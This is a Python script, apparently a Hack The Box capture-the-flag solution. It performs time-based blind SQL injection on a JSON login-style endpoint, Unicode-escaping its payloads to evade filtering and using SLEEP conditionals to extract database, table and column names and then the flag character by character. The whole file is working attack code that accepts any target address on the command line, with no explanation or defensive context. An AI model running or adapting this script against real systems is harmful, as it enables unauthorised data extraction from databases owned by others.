#!/usr/bin/python3
#TODO: Too slow add threading 

import requests
from time import time
from sys import argv
import string

try:
	url = f"http://{argv[1]}/"
except :
	print(f"Usage: {argv[0]} <ip:port>")
	exit(-1)

char_set = string.ascii_lowercase + '_' #+ string.digits  
flag_set = string.ascii_lowercase + '_' + string.digits + '}' #+ string.ascii_uppercase 

def uni_encode(payload):
	result = ""
	for i in range(len(payload)):
		result += '\\u%.4X' % ord(payload[i])
	return result	

def fetch_data(url, len_, name):
	global database
	print("[*]Getting info...")
	res = ""
	#print('{"user":"%s"}' % payload)
	for i in range(1, len_+1):
		for char in char_set:
			payload = f"d' AND (SELECT 1337 FROM (SELECT((IF((SELECT SUBSTR(column_name, {i}, 1) FROM information_schema.columns WHERE table_schema LIKE '{database}' AND table_name LIKE '%flag%' LIMIT 1 ) = '{char}' ,SLEEP(5),0))))x)-- wxyg"
			#print (payload)
			#exit()
			encoded_payload = uni_encode(payload)
			json_data = '{"user":"%s"}' % encoded_payload
			
			#print(encoded_payload)
			#print(json_data)
			try:
				start = time()
				r = requests.post(url, data=json_data)
				end = time()
			except :
				pass

			if (end - start) > 5:
				res += char
				print(f"[*]{name}: {res}")
				#break
			
	return res

def get_flag(url):
	global database, table, column
	print("[*]Getting Flag...")
	flag = "HTB{"
	
	while '}' not in flag:
		pos = len(flag) + 1
		for char in flag_set:
			payload = f"d' AND (SELECT 1337 FROM (SELECT((IF((SELECT SUBSTR({column}, {pos}, 1) FROM {database}.{table} ) = '{char}', SLEEP(3), 0))))x)-- wxyg"
			#print (payload)
			#exit()
			encoded_payload = uni_encode(payload)
			json_data = '{"user":"%s"}' % encoded_payload
			
			#print(encoded_payload)
			#print(json_data)
			try:
				start = time()
				r = requests.post(url, data=json_data)
				end = time()
			except :
				pass

			if (end - start) > 3:
				flag += char
				print(f"[*]FLag: {flag}")
				break
	return flag


#payload = "d' AND (SELECT 1337 FROM (SELECT((IF((SELECT SUBSTR(table_schema, 1, 1) FROM information_schema.tables WHERE table_schema LIKE '%db%' AND table_name LIKE '%flag%' LIMIT 1 ) = 'd' ,SLEEP(5),0))))x)-- wxyg"
# database = fetch_data(url, 8, Database)
# print(database)
database = "db_m8452"


#payload = f"d' AND (SELECT 1337 FROM (SELECT((IF((SELECT SUBSTR(table_name, {i}, 1) FROM information_schema.tables WHERE table_schema LIKE '{database}' AND table_name LIKE '%flag%' LIMIT 1 ) = '{char}' ,SLEEP(5),0))))x)-- wxyg"
#tables = fetch_data(url, 21, "Tables")
table = "definitely_not_a_flag"

#payload = f"d' AND (SELECT 1337 FROM (SELECT((IF((SELECT SUBSTR(column_name, {i}, 1) FROM information_schema.columns WHERE table_schema LIKE '{database}' AND table_name LIKE '%flag%' LIMIT 1 ) = '{char}' ,SLEEP(5),0))))x)-- wxyg"
#columns = fetch_data(url, 4, "Columns")
column = "flag"

print(f"[!]Flag: {get_flag(url)}")